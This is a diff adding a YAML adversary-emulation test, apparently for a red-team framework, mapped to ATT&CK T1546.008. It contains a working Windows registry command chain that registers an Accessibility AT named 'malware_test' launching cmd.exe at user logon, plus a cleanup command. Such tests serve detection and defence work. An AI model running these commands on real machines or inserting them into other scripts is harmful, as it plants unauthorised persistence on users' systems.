@@ -1,0 +1,28 @@
+---
+- id: 5c4ddfab7dde20f5f9241782ca92a9ab
+  name: Auto-start application on user logon
+  description: 'Executes code specified in the registry on new user logon session
+    automatically by registration of new AT and modification of configuration value.
+
+    This test will register new AT named malware_test with code for cmd.exe and add
+    a configuration value for the code to be run during user logon session.
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546.008
+    name: 'Event Triggered Execution: Accessibility Features'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /f && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f && reg add "HKLM\Software\Microsoft\Windows
+          NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ
+          /d C:\WINDOWS\system32\cmd.exe /f && reg add "HKLM\Software\Microsoft\Windows
+          NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test
+          /f
+        payloads: []
+        cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /f && reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"
+          /v Configuration /f
